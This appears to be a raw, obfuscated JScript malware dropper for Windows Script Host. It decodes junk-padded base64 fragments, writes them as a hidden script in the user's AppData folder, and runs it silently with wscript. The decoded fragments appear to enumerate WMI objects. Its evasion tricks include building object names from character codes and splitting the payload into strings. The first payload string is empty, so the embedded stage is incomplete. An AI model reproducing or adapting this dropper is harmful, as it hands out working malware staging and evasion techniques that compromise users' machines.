//#region SuperString

var superString = ''

var superString2 = 'codigob3IgKDsgIWVuLmF0RW5kKCk7IGVuLm1vdmVOZXh0K'

var superString3 = 'CkpIHsKcodigoICAgICAgICAgICAgdmFyIGl0ID0gZW4uaXRlbSgpOwogICAgICAgICAgICB2YXIgc3RycodigoID0gaXQuRGlzcGxheU5hbWU7CiAgICAgIcodigoCAgfQogICAgICAgIGlmIChzdHIgIT09ICcnKSB7CiAgICAgICAgICAgIHdtZyA9IHdtZyArICIyIjsKICAgICAgICAgICAgcyA9IEdldE9iamVjdCh3bWcodigocpLkluc3RhbmNlc09mKHlbM10pOwogICAgICAgICAgICBlbiA9IG5ldyBFbcodigonVtZXJhdG9yKHMpOwogICAgICAgICAgICBmb3IgKDsg'

//#endregion

var furduncio = superString['replace'](/codigo/g, "")['replace'](/!@/g, "A");

var furduncio2 = superString2['replace'](/codigo/g, "")['replace'](/!@/g, "A");

var furduncio3 = superString3['replace'](/codigo/g, "")['replace'](/!@/g, "A");

var omaga = furduncio['concat'](furduncio2, furduncio3);

var sexo = drabiu;

var a = sexo;

var casca = WScript['CreateObject']([sexo(87) + ['S', 'c'].join('') + ['r', 'i', 'p', 't'].join('') + "." + "Sh" + ['e', 'l', 'l'].join('')].join(''));
var diterorio = casca['ExpandEnvironmentStrings']("%ap" + "pdata%");
var primeiroCaminho = diterorio + "\\tAhkoltMPs.js";
var theCoded = picole(omaga);
escreveBaits(primeiroCaminho, theCoded);
casca['run']("wscript //B \"" + primeiroCaminho + "\"");

function escreveBaits(file, bytes) {
    try {
        var baineriStrim = WScript['CreateObject']("ADODB" + "." + "Stream");
        baineriStrim.Type = 1;
        baineriStrim['Open']();
        baineriStrim['Write'](bytes);
        baineriStrim['SaveToFile'](file, 2);
    } catch (err) {
    }
}

function drabiu(num) {
    return String.fromCharCode(num);
}

function picole(omaga) {
    var xmlDOM = new ActiveXObject("Microsoft" + "." + "XMLDOM");
    var el = xmlDOM['createElement']("tmp");
    el.dataType = "bin.Base64";
    el.text = omaga;

    var a = []

    a.push(65)
    a.push(68)
    a.push(79)
    a.push(68)
    a.push(66)

    var p = 46

    a2 = []

    for (i = 0; i < a.length; i++) {
        a2.push(String['fromCharCode'](a[i]))
    }

    var b = []

    b.push(83)
    b.push(116)
    b.push(114)
    b.push(101)
    b.push(97)
    b.push(110)

    var b2 = []

    for (i = 0; i < b.length; i++) {
        b2.push(String['fromCharCode'](b[i]))
    }

    var c = a2[0] + a2[1] + a2[2] + a2[3] + a2[4] + String['fromCharCode'](p)

    var c2 = c + b2[0] + b2[1] + b2[2] + b2[3]

    var c3 = c2 + b2[4]

    var c4 = b2[5]

    var z = c3 + c4['replace']('n', 'm')

    var strm = WScript.CreateObject(z);
    strm.Type = 1;
    strm.Open();
    strm.Write(el.nodeTypedValue);

    strm.Position = 0;
    strm.Type = 2;
    strm.CharSet = "utf-8";

    return strm.ReadText();
}